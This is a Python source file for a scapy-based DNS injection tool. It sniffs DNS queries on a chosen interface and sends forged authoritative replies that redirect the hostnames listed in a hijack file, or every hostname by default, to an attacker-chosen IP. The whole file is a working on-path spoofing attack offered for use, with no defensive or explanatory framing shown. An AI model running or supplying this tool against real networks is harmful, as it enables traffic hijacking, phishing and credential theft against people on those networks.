import argparse
from netifaces import interfaces, ifaddresses, AF_INET
import sys

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


def get_interface(iface):

    interf = None
    ip = None

    for interface in interfaces():
        if 'lo' in interface:
            continue

        addresses = [i['addr'] for i in ifaddresses(interface).setdefault(AF_INET, [{'addr': 'No IP addr'}])]

        if addresses == 'No IP addr':
            continue

        ip = ''.join(addresses)

        if iface:
            if iface == interface:
                interf = interface
        else:
            interf = interface

    return interf, ip


def pkt_parser(pkt):

    if pkt.haslayer(IP) and pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt.haslayer(DNSQR):

        if "*" in host_map:
            redirect_ip = host_map["*"]
        else:
            lookup_url = pkt[DNSQR].qname.decode("utf-8")
            lookup_url = lookup_url.rstrip('.')
            redirect_ip = host_map.get(lookup_url, None)

        if redirect_ip:
            if pkt.haslayer(UDP):
                spoofed_pkt = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst) / \
                              IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                              DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,
                                  an=DNSRR(rrname=pkt[DNS].qd.qname, type=pkt[DNSQR].qtype,
                                           rclass=pkt[DNSQR].qclass, ttl=111, rdata=redirect_ip))
                del spoofed_pkt[UDP].chksum
            elif pkt.haslayer(TCP):
                spoofed_pkt = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst) / \
                              IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                              TCP(dport=pkt[TCP].sport, sport=pkt[TCP].dport) / \
                              DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,
                                  an=DNSRR(rrname=pkt[DNS].qd.qname, type=pkt[DNSQR].qtype,
                                           rclass=pkt[DNSQR].qclass, ttl=222, rdata=redirect_ip))
                del spoofed_pkt[TCP].chksum
            else:
                # Ignoring non UDP/TCP DNS requests if any.
                return

            del spoofed_pkt[IP].chksum
            sendp(spoofed_pkt, iface=interface)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=False)

    parser.add_argument("-i", type=str, dest="interface", help="Listening Interface on Network Device.", )
    parser.add_argument("-h", type=str, dest="hostnames", help="Location of the Hostname File.")
    parser.add_argument("expression", type=str, help="BPF Filter String.", default="", nargs="?")
    parser.add_argument('--help', action='store_true', default=False)

    args = parser.parse_args()

    if args.help:
        print("Usage: sudo python dnsinject.py [-i interface] [-h hostnames] expression")
        print("-i: Listen on network device <interface> (e.g., eth0).")
        print("-h: File containing list of IP address and hostname pairs to be hijacked.")
        print("expression: BPF filter that specifies a subset of the traffic to be monitored.")
        sys.exit(-1)

    host_map = {}

    if args.interface:
        interface, ip = get_interface(args.interface)
    else:
        interface, ip = get_interface(conf.iface)

    if not interface or not ip:
        print("Error: Interface or IP not found.")
        sys.exit(-1)

    if args.hostnames:
        file = open(args.hostnames, "r")
        for line in file:
            host = line.split()
            host_map[host[1]] = host[0]
    else:
        host_map["*"] = ip

    expression = ""
    if args.expression:
        expression = args.expression

    sniff(iface=interface, prn=pkt_parser, filter=expression, store=0)
